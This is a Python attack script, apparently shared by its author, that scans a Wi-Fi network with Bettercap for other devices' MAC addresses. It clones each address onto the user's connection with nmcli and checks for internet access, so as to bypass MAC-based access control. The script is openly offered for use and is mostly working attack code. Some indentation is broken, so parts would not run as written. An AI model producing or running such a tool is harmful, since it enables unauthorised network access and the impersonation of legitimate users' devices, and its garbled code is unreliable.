#!/usr/bin/env python3
import random
import subprocess
import time
import os
import re
import sys
import argparse
import platform
import random

# ANSI color codes for colorful output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    banner = f"""
{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════════════╗
║    Telegram&Github - @EndAFK   MAC Address Spoofer             ║
║                                                                ║
║  This script automatically finds and tests MAC addresses       ║
║  to find one that works with your WiFi network.                ║
║                                                                ║
║  Usage: sudo python3 pwn.py                                    ║
║                                                                ║
║  Requirements:                                                 ║
║  - Linux operating system                                      ║
║  - Bettercap installed                                         ║
║  - NetworkManager installed                                    ║
║  - Sudo/administrator privileges                               ║
╚════════════════════════════════════════════════════════════════╝{Colors.ENDC}
"""
    print(banner)

def check_os():
    if platform.system() != "Linux":
        print(f"{Colors.RED}[!] This script only works on Linux systems{Colors.ENDC}")
        print(f"{Colors.YELLOW}[!] You are running: {platform.system()} {platform.release()}{Colors.ENDC}")
        print(f"{Colors.YELLOW}[!] For Windows users:{Colors.ENDC}")
        print(f"{Colors.YELLOW}    - Consider using WSL (Windows Subsystem for Linux)-May not Work{Colors.ENDC}")
        print(f"{Colors.YELLOW}    - Or use a Linux virtual machine{Colors.ENDC}")
        print(f"{Colors.YELLOW}    - Or boot from a Linux live USB{Colors.ENDC}")
        sys.exit(1)
    print(f"{Colors.GREEN}[+] Running on Linux: {platform.system()} {platform.release()}{Colors.ENDC}")

def check_root():
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!] This script must be run as root (with sudo){Colors.ENDC}")
        print(f"{Colors.YELLOW}    Please run: sudo python3 {sys.argv[0]}{Colors.ENDC}")
        sys.exit(1)

def check_dependencies():
    
    # Check if bettercap is installed
    try:
        subprocess.run(["which", "bettercap"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Colors.GREEN}[+] Bettercap is installed{Colors.ENDC}")
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[-] Bettercap is not installed{Colors.ENDC}")
        print(f"{Colors.YELLOW}[!] Please install Bettercap using one of the following methods:{Colors.ENDC}")
        print(f"{Colors.YELLOW}    - For Debian/Ubuntu: sudo apt install bettercap{Colors.ENDC}")
        print(f"{Colors.YELLOW}    - For Fedora: sudo dnf install bettercap{Colors.ENDC}")
        print(f"{Colors.YELLOW}    - For Arch Linux: sudo pacman -S bettercap{Colors.ENDC}")
        print(f"{Colors.YELLOW}    - For other distributions, check: https://www.bettercap.org/installation/{Colors.ENDC}")
        sys.exit(1)
    
    # Check if nmcli is installed
    try:
        subprocess.run(["which", "nmcli"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        print(f"{Colors.RED}[-] NetworkManager CLI (nmcli) is not installed{Colors.ENDC}")
        print(f"{Colors.YELLOW}[!] Please install NetworkManager using your package manager{Colors.ENDC}")
        sys.exit(1)
    

def get_mac_addresses():
    """Runs Bettercap to capture MAC addresses of connected devices."""
    # Remove existing mac_list.txt if it exists
    if os.path.exists("mac_list.txt"):
        os.remove("mac_list.txt")
    
    # Remove existing working_mac.txt if it exists
    if os.path.exists("working_mac.txt"):
        os.remove("working_mac.txt")
        
    print(f"{Colors.BLUE}[+] Scanning for MAC addresses...{Colors.ENDC}")
    
    # Run bettercap and capture its output
    try:
        print(f"{Colors.BLUE}[+] Running Bettercap command...{Colors.ENDC}")
        result = subprocess.run(
            ["sudo", "bettercap", "-eval", "net.probe on; sleep 5; net.show; quit"],
            capture_output=True,
            text=True
        )
        
        print(f"{Colors.BLUE}[+] Bettercap stdout: {result.stdout[:200]}...{Colors.ENDC}")  # Show first 200 chars
        if result.stderr:
            print(f"{Colors.RED}[!] Bettercap stderr: {result.stderr}{Colors.ENDC}")
        
        # Regex for MAC addresses (xx:xx:xx:xx:xx:xx format)
        mac_pattern = re.compile(r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})')
        
        # Find all MAC addresses in the output
        mac_addresses = list(set(mac_pattern.findall(result.stdout)))
        
        print(f"{Colors.BLUE}[+] Found {len(mac_addresses)} MAC addresses in output{Colors.ENDC}")
        if len(mac_addresses) > 0:
            print(f"{Colors.BLUE}[+] First MAC found: {mac_addresses[0]}{Colors.ENDC}")
        
        # Write only MAC addresses to the file
        with open("mac_list.txt", "w") as file:
            for mac in mac_addresses:
                file.write(f"{mac}\n")
        
        if not mac_addresses:
            print(f"{Colors.RED}[-] No MAC addresses found. Exiting.{Colors.ENDC}")
            sys.exit(1)
        
        print(f"{Colors.GREEN}[+] Found {len(mac_addresses)} unique MAC addresses{Colors.ENDC}")
        return mac_addresses
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error running Bettercap: {str(e)}{Colors.ENDC}")
        sys.exit(1)

def change_mac(new_mac, connection_name):
    print(f"[+] Setting new MAC for '{connection_name}': {new_mac}")

    subprocess.run(
        f'nmcli connection modify "{connection_name}" wifi.cloned-mac-address {new_mac}',
        shell=True,
        check=True
    )

    print(f"[+] Deactivating connection '{connection_name}'...")

    subprocess.run(
        f'nmcli connection down "{connection_name}"',
        shell=True,
        check=True
    )
    time.sleep(1)

    print(f"[+] Activating connection '{connection_name}' with new MAC...")

    subprocess.run(
        f'nmcli connection up "{connection_name}"',
        shell=True,
        check=True
    )
    print(f"[+] Connection command sent. Monitor status with 'nmcli device status'")

def check_internet():
    print(f"{Colors.BLUE}[+] Checking internet access...{Colors.ENDC}")
    
       endpoints = [
        ("8.8.8.8", "Google DNS"),
        ("1.1.1.1", "Cloudflare DNS"),
        ("208.67.222.222", "OpenDNS"),
    ]
    
    for ip, name in endpoints:
        try:
            subprocess.run(
                ["ping", "-c", "1", "-W", "5", ip],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10
            )
            print(f"{Colors.GREEN}[+] Internet access confirmed via {name}!{Colors.ENDC}")
            return True
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            print(f"{Colors.YELLOW}[-] Ping failed for {name} ({ip}){Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[-] Error while pinging {name} ({ip}): {str(e)}{Colors.ENDC}")

    print(f"{Colors.RED}[-] No internet access detected. Trying another MAC...{Colors.ENDC}")
    return False

def get_active_wifi_connection():
    try:
            result = subprocess.run(
            "nmcli -t -f NAME connection show --active",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if result.stdout:
            lines = result.stdout.strip().split('\n')
            
            connection_name = lines[0]
            
            if connection_name.startswith('"') and connection_name.endswith('"'):
                connection_name = connection_name[1:-1]
                
            print(f"{Colors.GREEN}[+] Found active WiFi connection: {connection_name}{Colors.ENDC}")
            return connection_name
        else:
            print(f"{Colors.RED}[-] No active WiFi connection found{Colors.ENDC}")
            sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[-] Error getting WiFi connection: {str(e)}{Colors.ENDC}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='MAC Address Spoofer')
    args = parser.parse_args()
    
    print_banner()
    
    check_os()
    check_root()
    check_dependencies()
    
    connection_name = get_active_wifi_connection()
    mac_addresses = get_mac_addresses()
    
    print(f"{Colors.BLUE}[+] Starting MAC address testing...{Colors.ENDC}")
    print(f"{Colors.YELLOW}[!] This will test all MAC addresses. Please be patient.{Colors.ENDC}")
    print(f"{Colors.YELLOW}[!] Working MACs will be saved to working_mac.txt as they are found{Colors.ENDC}")
    
    working_macs_count = 0
    
    # Create empty working_mac.txt file
    open("working_mac.txt", "w").close()
    
    for i, mac in enumerate(mac_addresses, 1):
        print(f"{Colors.BLUE}[+] Testing MAC {i}/{len(mac_addresses)}: {mac}{Colors.ENDC}")
        change_mac(mac, connection_name)
        time.sleep(5)  # Allow time for reconnection
        if check_internet():
            print(f"{Colors.GREEN}[+] Working MAC found: {mac}{Colors.ENDC}")
            # Append the working MAC to file immediately
            with open("working_mac.txt", "a") as f:
                f.write(f"{mac}\n")
            working_macs_count += 1
            print(f"{Colors.GREEN}[+] MAC address saved to working_mac.txt{Colors.ENDC}")
    
    if working_macs_count > 0:
        print(f"{Colors.GREEN}[+] Found {working_macs_count} working MAC addresses{Colors.ENDC}")
        print(f"{Colors.GREEN}[+] All working MACs have been saved to working_mac.txt{Colors.ENDC}")
    else:
        print(f"{Colors.RED}[!] No working MAC addresses found. Try again later.{Colors.ENDC}")
    
if __name__ == "__main__":
    main()
